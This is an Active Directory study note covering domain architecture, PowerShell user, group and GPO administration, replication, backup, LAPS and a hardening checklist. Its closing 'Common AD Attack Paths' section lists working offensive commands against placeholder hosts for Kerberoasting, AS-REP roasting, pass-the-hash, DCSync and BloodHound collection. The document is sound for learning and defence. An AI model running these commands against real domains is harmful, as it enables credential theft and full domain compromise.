---
title: Active Directory Fundamentals
tags: '["fundamentals", "active-directory", "windows", "authentication", "AD",
  "sysadmin", "intermediate"]'
difficulty: intermediate
created: 2026-03-23
updated: 2026-03-28
source: Microsoft Learn (AD DS docs), NIST SP 800-63B, CIS benchmark for Windows Server
---

# Active Directory Fundamentals

## Overview
Active Directory (AD) is Microsoft's directory service for Windows domain networks. It stores information about network objects (users, computers, groups, policies) and controls authentication and authorization. For sysadmins, AD is the backbone of identity management. For security teams, AD misconfigurations are the most common path to full domain compromise.

---

## Core Architecture

### Domain
A logical grouping of objects (users, computers, groups) sharing an AD database. Managed by Domain Controllers. Example: `corp.local`

### Domain Controller (DC)
Windows Server running AD DS. Handles authentication (Kerberos/NTLM), authorization (GPO/ACLs), DNS, and replication. **Highest-value target** — DC compromise = full domain compromise.

### Organizational Unit (OU)
Container for organizing objects and applying GPOs. Typical OU structure:
```
corp.local
├── _Admin
│   ├── Admin Users
│   └── Admin Workstations
├── Departments
│   ├── IT
│   ├── Finance
│   └── HR
├── Servers
│   ├── Member Servers
│   └── Database Servers
├── Workstations
├── Service Accounts
└── Disabled Accounts
```

### Forest, Tree, and Trust
- **Forest** — top-level container; one or more domains sharing a schema and global catalog
- **Tree** — hierarchy of domains sharing a contiguous namespace
- **Trust** — relationship between domains/forests enabling cross-boundary authentication

| Trust Type | Direction | Transitive | Use |
|---|---|---|---|
| Parent-Child | Two-way | Yes | Automatic within forest |
| Tree-Root | Two-way | Yes | Between tree roots in forest |
| External | One or two-way | No | Between domains in different forests |
| Forest | One or two-way | Yes | Between forest roots |

---

## AD Administration — Day-to-Day Tasks

### User Account Management

```powershell
# Create user
New-ADUser -Name "John Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@corp.local" `
  -Path "OU=IT,OU=Departments,DC=corp,DC=local" -AccountPassword (Read-Host -AsSecureString "Password") `
  -Enabled $true -ChangePasswordAtLogon $true

# Modify user
Set-ADUser -Identity jsmith -Title "Systems Administrator" -Department "IT" -Office "Building A"
Set-ADUser -Identity jsmith -Manager (Get-ADUser -Identity "mjones")

# Disable / Enable
Disable-ADAccount -Identity jsmith
Enable-ADAccount -Identity jsmith

# Unlock
Unlock-ADAccount -Identity jsmith
Search-ADAccount -LockedOut | Select-Object Name, SamAccountName, LockedOut

# Reset password
Set-ADAccountPassword -Identity jsmith -Reset -NewPassword (ConvertTo-SecureString "TempP@ss1!" -AsPlainText -Force)
Set-ADUser -Identity jsmith -ChangePasswordAtLogon $true

# Move user to different OU
Move-ADObject -Identity (Get-ADUser jsmith) -TargetPath "OU=Disabled Accounts,DC=corp,DC=local"

# Bulk operations
Get-ADUser -Filter {Department -eq "Finance"} | Set-ADUser -Office "Floor 3"
Import-Csv users.csv | ForEach-Object { New-ADUser -Name $_.Name -SamAccountName $_.SAM -Path $_.OU -Enabled $true }
```

### Group Management

```powershell
# Create group
New-ADGroup -Name "VPN Users" -GroupScope Global -GroupCategory Security `
  -Path "OU=Groups,DC=corp,DC=local" -Description "Users with VPN access"

# Add/remove members
Add-ADGroupMember -Identity "VPN Users" -Members jsmith, mjones
Remove-ADGroupMember -Identity "VPN Users" -Members jsmith -Confirm:$false

# List members
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name, SamAccountName

# Find user's groups
Get-ADUser jsmith -Properties MemberOf | Select-Object -ExpandProperty MemberOf
```

### Computer Account Management

```powershell
# Pre-stage computer account
New-ADComputer -Name "WS-IT-042" -Path "OU=Workstations,DC=corp,DC=local"

# Find stale computers (no logon in 90 days)
$cutoff = (Get-Date).AddDays(-90)
Get-ADComputer -Filter {LastLogonTimestamp -lt $cutoff} -Properties LastLogonTimestamp |
  Select-Object Name, @{N='LastLogon';E={[DateTime]::FromFileTime($_.LastLogonTimestamp)}}

# Domain join (from client, run as admin)
Add-Computer -DomainName "corp.local" -OUPath "OU=Workstations,DC=corp,DC=local" -Credential (Get-Credential) -Restart
```

---

## Group Policy (GPO) Administration

### Core GPO Operations

```powershell
Import-Module GroupPolicy

# List all GPOs
Get-GPO -All | Select-Object DisplayName, GpoStatus, ModificationTime | Sort-Object DisplayName

# Create new GPO
New-GPO -Name "Security - Password Policy" -Comment "Enforce corporate password standards"

# Link GPO to OU
New-GPLink -Name "Security - Password Policy" -Target "OU=Departments,DC=corp,DC=local"

# Unlink GPO
Remove-GPLink -Name "Old Policy" -Target "OU=Departments,DC=corp,DC=local"

# Backup all GPOs
Backup-GPO -All -Path "C:\GPOBackups\$(Get-Date -Format yyyy-MM-dd)"

# Restore GPO
Restore-GPO -Name "Security - Password Policy" -Path "C:\GPOBackups\2026-03-28"

# Report
Get-GPOReport -All -ReportType HTML -Path "C:\Reports\AllGPOs.html"
gpresult /h C:\Reports\rsop.html          # Applied policies on this machine
```

### GPO Processing Order (LSDOU)
```
Local Policy → Site → Domain → OU (nested OUs in order)
Last applied wins (closest OU to the object)
Enforcement: "Enforced" on a higher GPO overrides Block Inheritance on child OUs
```

### Common GPO Settings (Security)

**Password Policy** (Default Domain Policy):
```
Minimum password length: 12+ characters
Password history: 24 passwords remembered
Maximum password age: 90 days
Complexity requirements: Enabled
Account lockout threshold: 5 invalid attempts
Account lockout duration: 30 minutes
Reset lockout counter after: 30 minutes
```

**Audit Policy** (Computer Config → Windows Settings → Security Settings → Advanced Audit):
```
Audit Logon Events: Success + Failure
Audit Account Logon: Success + Failure
Audit Account Management: Success + Failure
Audit Object Access: Success + Failure
Audit Process Creation: Success (enable command line in process creation events)
```

**Security Options:**
```
Restrict anonymous access to named pipes and shares
Do not display last user name at logon
Disable LM hash storage
Require NTLMv2 authentication (refuse LM and NTLM)
```

---

## DNS in Active Directory

AD-integrated DNS is critical — AD depends on DNS for service location (SRV records).

```powershell
# Check DNS zones
Get-DnsServerZone | Select-Object ZoneName, ZoneType, IsReverseLookupZone

# Check SRV records (critical for AD)
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.corp.local" -Type SRV

# Create DNS record
Add-DnsServerResourceRecordA -Name "webserver" -ZoneName "corp.local" -IPv4Address "10.0.1.50"

# Scavenging (clean stale records)
Set-DnsServerScavenging -ScavengingState $true -ScavengingInterval 7.00:00:00
```

---

## AD Replication & Health

```powershell
# Replication status
repadmin /replsummary                  # Quick health summary
repadmin /showrepl                     # Detailed replication status per DC
repadmin /syncall /AdeP                # Force sync all partitions to all partners

# DC diagnostics
dcdiag /v                              # Comprehensive DC health check
dcdiag /test:dns                       # DNS-specific tests
dcdiag /test:replications              # Replication test

# AD database integrity
ntdsutil                               # Interactive — semantic database analysis

# Check FSMO role holders
netdom query fsmo                      # All 5 FSMO roles
Get-ADForest | Select-Object SchemaMaster, DomainNamingMaster
Get-ADDomain | Select-Object PDCEmulator, RIDMaster, InfrastructureMaster
```

### FSMO Roles
| Role | Scope | Purpose |
|---|---|---|
| Schema Master | Forest | Controls schema modifications |
| Domain Naming Master | Forest | Controls adding/removing domains |
| PDC Emulator | Domain | Password changes, time sync, account lockout |
| RID Master | Domain | Allocates RID pools for new object creation |
| Infrastructure Master | Domain | Cross-domain object reference updates |

---

## AD Backup & Recovery

```powershell
# Windows Server Backup — System State (includes AD database)
wbadmin start systemstatebackup -backupTarget:E:

# Verify backup
wbadmin get versions

# Authoritative restore (DSRM boot required):
# 1. Boot into Directory Services Restore Mode (DSRM)
# 2. wbadmin start systemstaterecovery -version:<version>
# 3. ntdsutil → activate instance ntds → authoritative restore → restore object "OU=..."
# 4. Reboot normally

# AD Recycle Bin (enable once — cannot be disabled)
Enable-ADOptionalFeature -Identity "Recycle Bin Feature" -Scope ForestOrConfigurationSet -Target "corp.local"

# Restore deleted object
Get-ADObject -Filter {Name -eq "John Smith"} -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects | Select-Object Name, ObjectClass
```

---

## LAPS (Local Administrator Password Solution)

LAPS randomizes the local admin password on each domain-joined computer and stores it in AD.

```powershell
# Check LAPS deployment
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
  Select-Object Name, @{N='Password';E={$_.'ms-Mcs-AdmPwd'}}, @{N='Expiry';E={[DateTime]::FromFileTime($_.'ms-Mcs-AdmPwdExpirationTime')}}

# Retrieve LAPS password for specific computer
Get-ADComputer -Identity "WS-IT-042" -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd

# Windows LAPS (newer, built into Windows 11/Server 2025)
Get-LapsADPassword -Identity "WS-IT-042" -AsPlainText
```

---

## AD Sites & Services

Sites define the physical topology for replication and client authentication optimization.

```powershell
# List sites
Get-ADReplicationSite -Filter *

# List subnets mapped to sites
Get-ADReplicationSubnet -Filter * | Select-Object Name, Site

# Create site and map subnet
New-ADReplicationSite -Name "BranchOffice-NYC"
New-ADReplicationSubnet -Name "10.20.0.0/16" -Site "BranchOffice-NYC"
```

---

## Certificate Services (AD CS) Overview

AD CS provides PKI for the domain — issues certificates for computers, users, and services (SSL, smart card, code signing).

```powershell
# List CA servers
certutil -config - -ping

# Request a certificate
certreq -submit request.req

# List issued certificates
certutil -view -restrict "disposition=20"

# Common cert templates: Domain Controller, Web Server, User, Computer, Workstation Authentication
```

**Security note:** Misconfigured certificate templates are a major attack vector (ESC1-ESC8 attacks). Audit templates for: enrollment permissions, SANs allowed, EKU, manager approval required.

---

## Authentication Protocols

### Kerberos (Port 88) — Primary
```
1. Client → KDC (AS-REQ): "I am jsmith, give me a TGT"
   KDC verifies password hash → issues TGT

2. Client → KDC (TGS-REQ): "I have a TGT, give me a ticket for SQL server"
   KDC issues Service Ticket encrypted with service account hash

3. Client → Service (AP-REQ): presents Service Ticket
   Service decrypts → grants access
```

### NTLM (Legacy) — Challenge-Response
Used when Kerberos unavailable (IP-based access, cross-forest without Kerberos trust). Should be restricted to NTLMv2 only via GPO.

---

## High-Value AD Groups

| Group | Privilege |
|---|---|
| Domain Admins | Full domain control |
| Enterprise Admins | Full forest control |
| Schema Admins | Can modify AD schema |
| Administrators | Local admin on all DCs |
| Account Operators | Can create/modify accounts |
| Backup Operators | Bypass file permissions |
| Group Policy Creator Owners | Create/edit GPOs |

**Audit regularly:** Members of these groups should be reviewed monthly. Use `Get-ADGroupMember -Recursive`.

---

## AD Hardening Checklist

```
□ Enable audit policies (logon, account management, process creation)
□ Deploy LAPS — randomize local admin passwords
□ Enforce NTLMv2 only — disable LM and NTLMv1 via GPO
□ Disable LLMNR and NBT-NS (Responder attack mitigation)
□ Require SMB signing
□ Deploy tiered administration model (Tier 0/1/2)
□ Protect Domain Admins — dedicated admin workstations (PAWs)
□ Enable Protected Users security group for privileged accounts
□ Set AdminSDHolder to monitor privileged group changes
□ Configure fine-grained password policies for admins (15+ chars)
□ Disable pre-authentication only where absolutely required
□ Deploy Sysmon on all endpoints
□ Enable AD Recycle Bin
□ Regular AD backup (System State)
□ Audit certificate templates (AD CS)
□ Review stale accounts quarterly (disable > delete)
□ Monitor FSMO role holders
```

---

## Common AD Attack Paths

### Kerberoasting
```bash
GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip 10.10.10.10 -request
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### AS-REP Roasting
```bash
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

### Pass-the-Hash
```bash
crackmapexec smb 10.10.10.10 -u Administrator -H 'NTLM_HASH'
psexec.py -hashes ':NTLM_HASH' Administrator@10.10.10.10
```

### DCSync (requires Replicating Directory Changes privs)
```bash
secretsdump.py corp.local/admin:Password1@10.10.10.10
```

### Golden / Silver Ticket
- **Golden:** Forge TGT using krbtgt hash → persistent domain access
- **Silver:** Forge Service Ticket using service hash → access specific service

### BloodHound — Attack Path Mapping
```bash
bloodhound-python -u jsmith -p Password1 -d corp.local -dc 10.10.10.10 -c All
# Import into BloodHound GUI → Shortest Path to Domain Admin
```

---

## Key AD Ports
| Port | Service |
|---|---|
| 53 | DNS |
| 88 | Kerberos |
| 135 | MS-RPC |
| 389/636 | LDAP/LDAPS |
| 445 | SMB |
| 3268/3269 | Global Catalog |
| 5985/5986 | WinRM |

---

## Key Terms
| Term | Definition |
|---|---|
| DC | Domain Controller |
| TGT | Ticket Granting Ticket (Kerberos) |
| SPN | Service Principal Name — Kerberoasting target |
| GPO | Group Policy Object |
| ACL/ACE | Access Control List / Entry |
| DACL/SACL | Discretionary / System ACL |
| krbtgt | Kerberos service account — Golden Ticket target |
| LAPS | Local Admin Password Solution |
| PAW | Privileged Access Workstation |
| FSMO | Flexible Single Master Operations roles |

---

## Related Notes
- Windows-Commands
- Windows-Privilege-Escalation
- BloodHound
- AD-Attack-Reference
- PowerShell-Security
- System-Admin-Reference
- Networking-Basics

## Sources

Microsoft. (2024). *Active Directory domain services overview*. Microsoft Learn. https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/

National Institute of Standards and Technology. (2017). *Digital identity guidelines: Authentication and lifecycle management* (NIST SP 800-63B). U.S. Department of Commerce. https://pages.nist.gov/800-63-3/sp800-63b.html

Center for Internet Security. (2024). *CIS benchmark for Microsoft Windows server*. CIS. https://www.cisecurity.org/benchmark/microsoft_windows_server

Microsoft. (2024). *Windows LAPS overview*. Microsoft Learn. https://learn.microsoft.com/en-us/windows-server/identity/laps/

---
*Updated: 2026-03-28 | Difficulty: Intermediate*
---
<- [[Fundamentals-MOC]]